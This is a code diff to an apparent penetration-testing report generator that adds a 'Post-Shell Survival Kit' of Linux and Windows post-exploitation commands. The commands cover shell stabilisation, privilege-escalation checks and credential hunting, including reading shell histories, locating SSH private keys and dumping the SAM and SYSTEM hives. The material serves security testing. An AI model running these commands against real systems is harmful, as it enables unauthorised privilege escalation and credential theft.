@@ -216,6 +216,162 @@ def _detect_pivot_indicators(info: "TargetInfo") -> List[str]:
 
 
 # ===========================================================================
+# Post-Shell Survival Kit
+# ===========================================================================
+
+def _post_shell_kit(os_type: str) -> List[str]:
+    """
+    Return Markdown lines for the Post-Shell Survival Kit section.
+
+    Always injected into the report.  Contents are OS-contextualised:
+      - "Linux"   → PTY upgrade, Linux LPE one-liners, Linux cred hunting
+      - "Windows" → Situational awareness, Windows LPE one-liners, Win cred hunting
+      - ""        → Both blocks (OS unknown at scan time)
+
+    Format rule: fenced code blocks only — NO checkbox lists.
+    These commands are meant to be double-clicked and pasted verbatim.
+    """
+    lines: List[str] = [
+        "---",
+        "",
+        "### 🐚 Post-Shell Survival Kit",
+        "",
+        "> Commands to run **immediately** after landing a shell, before anything else.",
+        "> All blocks use plain code fences — double-click to select the whole block.",
+        "",
+    ]
+
+    # ── Linux block ───────────────────────────────────────────────────────
+    if os_type in ("Linux", ""):
+        if os_type == "":
+            lines += ["#### 🐧 Linux Shell", ""]
+
+        lines += [
+            "**1. Stabilise the shell** *(pick whichever binary exists)*",
+            "",
+            "```bash",
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "# OR",
+            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "# OR",
+            "script -qc /bin/bash /dev/null",
+            "```",
+            "",
+            "> After spawning PTY:  `Ctrl+Z` → `stty raw -echo` → `fg` → `export TERM=xterm`",
+            "",
+            "**2. Situational awareness**",
+            "",
+            "```bash",
+            "id && whoami && hostname && ip a",
+            "cat /etc/passwd | grep -v nologin | grep -v false",
+            "sudo -l",
+            "uname -a && cat /etc/os-release",
+            "env | grep -i 'path\\|home\\|user\\|pass'",
+            "```",
+            "",
+            "**3. Manual LPE quick-wins** *(run before LinPEAS — fastest checks first)*",
+            "",
+            "```bash",
+            "# SUID binaries",
+            "find / -perm -u=s -type f 2>/dev/null",
+            "",
+            "# File capabilities",
+            "getcap -r / 2>/dev/null",
+            "",
+            "# Writable cron jobs",
+            "ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null",
+            "cat /etc/crontab 2>/dev/null",
+            "",
+            "# Writable systemd service files",
+            "find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null",
+            "",
+            "# sudo version (< 1.8.28 → CVE-2019-14287 / 1.9.5p1 → CVE-2021-3156)",
+            "sudo --version",
+            "",
+            "# World-writable files in interesting dirs",
+            "find /var/www /opt /srv /home -writable -type f 2>/dev/null | head -20",
+            "```",
+            "",
+            "**4. Credential hunting**",
+            "",
+            "```bash",
+            "# Config files containing password strings",
+            "grep -r 'password' /etc /home /var/www 2>/dev/null \\",
+            "  --include='*.conf' --include='*.php' --include='*.ini' \\",
+            "  --include='*.env' --include='*.xml' -l",
+            "",
+            "# Shell history",
+            "cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null",
+            "",
+            "# SSH keys",
+            "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
+            "",
+            "# Database connection strings",
+            "grep -r 'mysqli\\|PDO\\|mysql_connect\\|password' /var/www 2>/dev/null -l",
+            "```",
+            "",
+        ]
+
+    # ── Windows block ─────────────────────────────────────────────────────
+    if os_type in ("Windows", ""):
+        if os_type == "":
+            lines += ["#### 🪟 Windows Shell", ""]
+
+        lines += [
+            "**1. Situational awareness**",
+            "",
+            "```powershell",
+            "whoami /all",
+            "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
+            "net user && net localgroup administrators",
+            "ipconfig /all",
+            "```",
+            "",
+            "**2. Manual LPE quick-wins** *(run before WinPEAS — fastest checks first)*",
+            "",
+            "```powershell",
+            "# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege → Potato attacks",
+            "whoami /priv | findstr /i \"impersonate\\|assignprimary\"",
+            "",
+            "# AlwaysInstallElevated (both keys must be 1 → MSI privesc)",
+            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
+            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
+            "",
+            "# Unquoted service paths",
+            "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
+            "",
+            "# Writable service binaries",
+            "accesschk.exe /accepteula -uwcqv * 2>nul",
+            "",
+            "# Scheduled tasks (look for non-System tasks with writable binaries)",
+            "schtasks /query /fo LIST /v | findstr /i \"task to run\\|run as user\"",
+            "```",
+            "",
+            "**3. Credential hunting**",
+            "",
+            "```powershell",
+            "# Stored Windows credentials",
+            "cmdkey /list",
+            "",
+            "# SAM + SYSTEM hive dump (requires SYSTEM or Admin)",
+            "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv",
+            "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv",
+            "# Then on attacker: impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL",
+            "",
+            "# Password strings in common locations",
+            "Get-ChildItem C:\\ -Recurse -Include *.txt,*.ini,*.xml,*.config 2>$null `",
+            "  | Select-String \"password\" -List | Select-Object Path",
+            "",
+            "# Unattend / sysprep files",
+            "Get-ChildItem C:\\ -Recurse -Include unattend.xml,sysprep.xml,*.inf 2>$null",
+            "```",
+            "",
+        ]
+
+    return lines
+
+
+# ===========================================================================
 # Main generator
 # ===========================================================================
 
@@ -260,6 +416,9 @@ def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str
         for reason in pivot_reasons:
             lines.append(f"- ⚠️  {reason}")
         lines.append("")
+
+    # ── Post-Shell Survival Kit (always generated, OS-contextualised) ────────
+    lines += _post_shell_kit(os_type)
 
     # ── Windows tools ─────────────────────────────────────────────────────
     if os_type == "Windows":
